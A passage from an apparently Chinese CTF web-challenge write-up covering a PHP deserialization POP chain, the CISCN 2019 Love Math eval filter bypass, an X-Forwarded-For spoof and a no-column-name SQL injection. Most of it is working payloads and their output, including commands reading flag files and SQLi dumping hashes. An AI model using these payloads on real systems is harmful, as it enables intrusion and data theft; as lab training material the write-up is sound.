class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">//flag is in flag.php</span><br><span class="hljs-comment">//WTF IS THIS?</span><br><span class="hljs-comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span><br><span class="hljs-comment">//And Crack It!</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Modifier</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$var</span>;<span class="hljs-comment">//$var=&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;</span><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">append</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$value</span>);<span class="hljs-comment">//</span><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)//调用函数的方式调用一个对象时的回应方法</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;append(<span class="hljs-keyword">$this</span>-&gt;var);<span class="hljs-comment">//调用本函数的append方法</span><br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;index.php&#x27;</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;source = <span class="hljs-variable">$file</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Welcome to &#x27;</span> . <span class="hljs-keyword">$this</span>-&gt;source . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)//当一个对象被当作一个字符串使用</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;str-&gt;source;<span class="hljs-comment">//$show-&gt;str=$test,   $test-&gt;source会调用test的__get方法</span><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)//<span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)//将在反序列化之后立即被调用(<span class="hljs-params">通过序列化对象元素个数不符来绕过</span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="hljs-keyword">$this</span>-&gt;source)) <br>            <span class="hljs-comment">//$show1-&gt;source=$show,这里正则匹配就把show当作字符串处理了，进而调用show的tostring方法</span><br>        &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker&quot;</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;source = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;p = <span class="hljs-keyword">array</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)//<span class="hljs-title">__get</span>(<span class="hljs-params"></span>)在获得一个类的成员变量时调用</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$function</span> = <span class="hljs-keyword">$this</span>-&gt;p;<span class="hljs-comment">//p=new Modifiler()</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();   <span class="hljs-comment">//构造一个modifiler对象返回,进而调用Modifiler的__invoke方法</span><br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pop&#x27;</span>])) &#123;<br>    @unserialize(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> Show;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><br></code></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//EXP：</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Modifier</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$var</span>=<span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span>;<br>&#125;<br><span class="hljs-variable">$modifier</span>= <span class="hljs-keyword">new</span> Modifier();<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> Test();<br><span class="hljs-variable">$test</span>-&gt;p=<span class="hljs-variable">$modifier</span>;<br><span class="hljs-variable">$show</span>=<span class="hljs-keyword">new</span> Show();<br><span class="hljs-variable">$show</span>-&gt;str=<span class="hljs-variable">$test</span>;<br><br><span class="hljs-variable">$show1</span> = <span class="hljs-keyword">new</span> Show();<br><br><span class="hljs-variable">$show1</span>-&gt;source = <span class="hljs-variable">$show</span>;<br><br><span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-variable">$show1</span>));<br><span class="hljs-comment">//O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BN%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3BN%3B%7D</span><br><br></code></pre></td></tr></table></figure>

<h2 id="4-CISCN-2019-初赛-Love-Math"><a href="#4-CISCN-2019-初赛-Love-Math" class="headerlink" title="4.[CISCN 2019 初赛]Love Math"></a>4.[CISCN 2019 初赛]Love Math</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    show_source(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-comment">//例子 c=20-1</span><br>    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (strlen(<span class="hljs-variable">$content</span>) &gt;= <span class="hljs-number">80</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;太长了不会算&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>];<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>) &#123;<br>        <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$content</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span><br>    <span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">&#x27;abs&#x27;</span>, <span class="hljs-string">&#x27;acos&#x27;</span>, <span class="hljs-string">&#x27;acosh&#x27;</span>, <span class="hljs-string">&#x27;asin&#x27;</span>, <span class="hljs-string">&#x27;asinh&#x27;</span>, <span class="hljs-string">&#x27;atan2&#x27;</span>, <span class="hljs-string">&#x27;atan&#x27;</span>, <span class="hljs-string">&#x27;atanh&#x27;</span>, <span class="hljs-string">&#x27;base_convert&#x27;</span>, <span class="hljs-string">&#x27;bindec&#x27;</span>, <span class="hljs-string">&#x27;ceil&#x27;</span>, <span class="hljs-string">&#x27;cos&#x27;</span>, <span class="hljs-string">&#x27;cosh&#x27;</span>, <span class="hljs-string">&#x27;decbin&#x27;</span>, <span class="hljs-string">&#x27;dechex&#x27;</span>, <span class="hljs-string">&#x27;decoct&#x27;</span>, <span class="hljs-string">&#x27;deg2rad&#x27;</span>, <span class="hljs-string">&#x27;exp&#x27;</span>, <span class="hljs-string">&#x27;expm1&#x27;</span>, <span class="hljs-string">&#x27;floor&#x27;</span>, <span class="hljs-string">&#x27;fmod&#x27;</span>, <span class="hljs-string">&#x27;getrandmax&#x27;</span>, <span class="hljs-string">&#x27;hexdec&#x27;</span>, <span class="hljs-string">&#x27;hypot&#x27;</span>, <span class="hljs-string">&#x27;is_finite&#x27;</span>, <span class="hljs-string">&#x27;is_infinite&#x27;</span>, <span class="hljs-string">&#x27;is_nan&#x27;</span>, <span class="hljs-string">&#x27;lcg_value&#x27;</span>, <span class="hljs-string">&#x27;log10&#x27;</span>, <span class="hljs-string">&#x27;log1p&#x27;</span>, <span class="hljs-string">&#x27;log&#x27;</span>, <span class="hljs-string">&#x27;max&#x27;</span>, <span class="hljs-string">&#x27;min&#x27;</span>, <span class="hljs-string">&#x27;mt_getrandmax&#x27;</span>, <span class="hljs-string">&#x27;mt_rand&#x27;</span>, <span class="hljs-string">&#x27;mt_srand&#x27;</span>, <span class="hljs-string">&#x27;octdec&#x27;</span>, <span class="hljs-string">&#x27;pi&#x27;</span>, <span class="hljs-string">&#x27;pow&#x27;</span>, <span class="hljs-string">&#x27;rad2deg&#x27;</span>, <span class="hljs-string">&#x27;rand&#x27;</span>, <span class="hljs-string">&#x27;round&#x27;</span>, <span class="hljs-string">&#x27;sin&#x27;</span>, <span class="hljs-string">&#x27;sinh&#x27;</span>, <span class="hljs-string">&#x27;sqrt&#x27;</span>, <span class="hljs-string">&#x27;srand&#x27;</span>, <span class="hljs-string">&#x27;tan&#x27;</span>, <span class="hljs-string">&#x27;tanh&#x27;</span>];<br>    preg_match_all(<span class="hljs-string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="hljs-variable">$content</span>, <span class="hljs-variable">$used_funcs</span>);  <br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$used_funcs</span>[<span class="hljs-number">0</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$func</span>) &#123;<br>        <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//帮你算出答案</span><br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$content</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<br>&#125;<br><span class="hljs-comment">//白名单中的数学函数，.,^等，同时长度限制在80个字符以内</span><br><span class="hljs-comment">//有两种思路，在这之前有几个php的特点要熟悉。</span><br><br><span class="hljs-comment">//动态函数</span><br><span class="hljs-comment">//php中可以把函数名通过字符串的方式传递给一个变量，然后通过此变量动态调用函数</span><br><span class="hljs-comment">//例如：$function = &quot;sayHello&quot;;$function();</span><br><br><span class="hljs-comment">//php中函数名默认为字符串</span><br><span class="hljs-comment">//例如本题白名单中的asinh和pi可以直接异或，这就增加了构造字符的选择</span><br><span class="hljs-number">1</span>.payload<br><span class="hljs-variable">$pi</span>=base_convert(<span class="hljs-number">37907361743</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(dechex(<span class="hljs-number">1598506324</span>));(<span class="hljs-variable">$$pi</span>)&#123;pi&#125;((<span class="hljs-variable">$$pi</span>)&#123;abs&#125;)&amp;pi=system&amp;abs=tac /flag<br><br>base_convert(<span class="hljs-number">37907361743</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>) =&gt; <span class="hljs-string">&quot;hex2bin&quot;</span><br>dechex(<span class="hljs-number">1598506324</span>) =&gt; <span class="hljs-string">&quot;5f474554&quot;</span><br><span class="hljs-variable">$pi</span>=hex2bin(<span class="hljs-string">&quot;5f474554&quot;</span>) =&gt; <span class="hljs-variable">$pi</span>=<span class="hljs-string">&quot;_GET&quot;</span>   <span class="hljs-comment">//hex2bin将一串16进制数转换为二进制字符串</span><br>(<span class="hljs-variable">$$pi</span>)&#123;pi&#125;((<span class="hljs-variable">$$pi</span>)&#123;abs&#125;) =&gt; (<span class="hljs-variable">$_GET</span>)&#123;pi&#125;(<span class="hljs-variable">$_GET</span>)&#123;abs&#125;  <span class="hljs-comment">//&#123;&#125;可以代替[]</span><br><br><span class="hljs-number">2</span>.payload<br>    <br><span class="hljs-variable">$pi</span>=base_convert,<span class="hljs-variable">$pi</span>(<span class="hljs-number">696468</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(<span class="hljs-variable">$pi</span>(<span class="hljs-number">8768397090111664438</span>,<span class="hljs-number">10</span>,<span class="hljs-number">30</span>)()&#123;<span class="hljs-number">1</span>&#125;)<br>post传参执行命令<br>    <br>    <br><span class="hljs-number">3</span>.payload<br><span class="hljs-comment">//exec(&#x27;hex2bin(dechex(109270211257898))&#x27;) =&gt; exec(&#x27;cat f*&#x27;)</span><br>(<span class="hljs-variable">$pi</span>=base_convert)(<span class="hljs-number">22950</span>,<span class="hljs-number">23</span>,<span class="hljs-number">34</span>)(<span class="hljs-variable">$pi</span>(<span class="hljs-number">76478043844</span>,<span class="hljs-number">9</span>,<span class="hljs-number">34</span>)(dechex(<span class="hljs-number">109270211257898</span>)))<br><span class="hljs-comment">//system(&#x27;cat&#x27;.dechex(16)^asinh^pi) =&gt; system(&#x27;cat *&#x27;)</span><br>base_convert(<span class="hljs-number">1751504350</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(base_convert(<span class="hljs-number">15941</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>).(dechex(<span class="hljs-number">16</span>)^asinh^pi))<br>    <br>    <br>    <br></code></pre></td></tr></table></figure>

<h2 id="5-MRCTF2020-PYWebsite"><a href="#5-MRCTF2020-PYWebsite" class="headerlink" title="5.[MRCTF2020]PYWebsite"></a>5.[MRCTF2020]PYWebsite</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs js">   <br><span class="hljs-comment">//查看网页源代码发现有一个./flag.php网页,访问发现说只有购买者和我自己知道flag,所以加一个请求头X-Forward-For:127.0.0.1,然后继续访问拿到flag.</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">enc</span>(<span class="hljs-params">code</span>)</span>&#123;<br>      hash = hex_md5(code);<br>      <span class="hljs-keyword">return</span> hash;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">validate</span>(<span class="hljs-params"></span>)</span>&#123;<br>      <span class="hljs-keyword">var</span> code = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;vcode&quot;</span>).value;<br>      <span class="hljs-keyword">if</span> (code != <span class="hljs-string">&quot;&quot;</span>)&#123;<br>        <span class="hljs-keyword">if</span>(hex_md5(code) == <span class="hljs-string">&quot;0cd4da0223c0b280829dc3ea458d655c&quot;</span>)&#123;<br>          alert(<span class="hljs-string">&quot;您通过了验证！&quot;</span>);<br>          <span class="hljs-built_in">window</span>.location = <span class="hljs-string">&quot;./flag.php&quot;</span><br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>          alert(<span class="hljs-string">&quot;你的授权码不正确！&quot;</span>);<br>        &#125;<br>      &#125;<span class="hljs-keyword">else</span>&#123;<br>        alert(<span class="hljs-string">&quot;请输入授权码&quot;</span>);<br>      &#125;<br>    &#125;<br></code></pre></td></tr></table></figure>

<h2 id="6-SWPU2019-Web1"><a href="#6-SWPU2019-Web1" class="headerlink" title="6.[SWPU2019]Web1"></a>6.[SWPU2019]Web1</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;/**/union/**/select/**/1,user(),version(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x27;</span><span class="hljs-number">22</span><br>root<span class="hljs-variable">@localhost</span>	<span class="hljs-number">10.2</span><span class="hljs-number">.26</span><span class="hljs-operator">-</span>MariaDB<span class="hljs-operator">-</span>log<br><br><span class="hljs-number">1</span><span class="hljs-string">&#x27;/**/union/**/select/**/1,database(),version(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x27;</span><span class="hljs-number">22</span>web1	<span class="hljs-number">10.2</span><span class="hljs-number">.26</span><span class="hljs-operator">-</span>MariaDB<span class="hljs-operator">-</span>log<br><br><span class="hljs-number">1</span><span class="hljs-string">&#x27;/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats),version(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x27;</span><span class="hljs-number">22</span><br>FLAG_TABLE,news,users,gtid_slave_pos,ads,users<br><br><span class="hljs-number">1</span><span class="hljs-string">&#x27;/**/union/**/select/**/1,(select/**/group_concat(a)/**/from/**/(select/**/1,2,3/**/as/**/a/**/union/**/select/**/*/**/from/**/users)qaq),version(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x27;</span><span class="hljs-number">22</span><br><span class="hljs-number">3</span>,flag&#123;<span class="hljs-number">842</span>b63d9<span class="hljs-operator">-</span>f8ce<span class="hljs-number">-4346</span><span class="hljs-operator">-</span>ac05<span class="hljs-operator">-</span>a2713b4f8232&#125;,<span class="hljs-number">53e217</span>ad4c721eb9565cf25a5ec3b66e,e10adc3949ba59abbe56e057f20f883e<br><br><br>mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> secret;<br><span class="hljs-operator">+</span><span class="hljs-comment">------+------+--------+</span><br><span class="hljs-operator">|</span> kkk  <span class="hljs-operator">|</span> lion <span class="hljs-operator">|</span> leo    <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">------+------+--------+</span><br><span class="hljs-operator">|</span> <span class="hljs-number">1234</span> <span class="hljs-operator">|</span> <span class="hljs-number">5678</span> <span class="hljs-operator">|</span> <span class="hljs-number">123123</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">------+------+--------+</span><br>mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> secret;<br><span class="hljs-operator">+</span><span class="hljs-comment">------+------+--------+</span><br><span class="hljs-operator">|</span> <span class="hljs-number">1</span>    <span class="hljs-operator">|</span> <span class="hljs-number">2</span>    <span class="hljs-operator">|</span> <span class="hljs-number">3</span>      <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">------+------+--------+</span><br><span class="hljs-operator">|</span>    <span class="hljs-number">1</span> <span class="hljs-operator">|</span>    <span class="hljs-number">2</span> <span class="hljs-operator">|</span>      <span class="hljs-number">3</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> <span class="hljs-number">1234</span> <span class="hljs-operator">|</span> <span class="hljs-number">5678</span> <span class="hljs-operator">|</span> <span class="hljs-number">123123</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">------+------+--------+</span><br>mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> secret;<br><span class="hljs-operator">+</span><span class="hljs-comment">------+------+--------+</span><br><span class="hljs-operator">|</span> kkk  <span class="hljs-operator">|</span> lion <span class="hljs-operator">|</span> leo    <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">------+------+--------+</span><br><span class="hljs-operator">|</span> <span class="hljs-number">1234</span> <span class="hljs-operator">|</span> <span class="hljs-number">5678</span> <span class="hljs-operator">|</span> <span class="hljs-number">123123</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">------+------+--------+</span><br>mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> `<span class="hljs-number">2</span>` <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> secret)asd;<br><span class="hljs-operator">+</span><span class="hljs-comment">------+</span><br><span class="hljs-operator">|</span> <span class="hljs-number">2</span>    <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">------+</span><br><span class="hljs-operator">|</span>    <span class="hljs-number">2</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> <span class="hljs-number">5678</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">------+</span><br>mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> a <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span> <span class="hljs-keyword">as</span> a,<span class="hljs-number">3</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> secret)qw;<br><span class="hljs-operator">+</span><span class="hljs-comment">------+</span><br><span class="hljs-operator">|</span> a    <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">------+</span><br><span class="hljs-operator">|</span>    <span class="hljs-number">2</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> <span class="hljs-number">5678</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">------+</span><br><br>过滤了<span class="hljs-keyword">order</span>的时候，可以用<span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> 来测试有多少行<br>单引号闭合，正常闭合会出错的话，可以,<span class="hljs-string">&#x27;2。这样闭合</span><br><span class="hljs-string">无列名注入</span><br><span class="hljs-string">一般都有limit 0,1的限制，可用group_concat()来将数据弄到一行中去</span><br><span class="hljs-string">空格用/**/内敛注释绕过</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure>



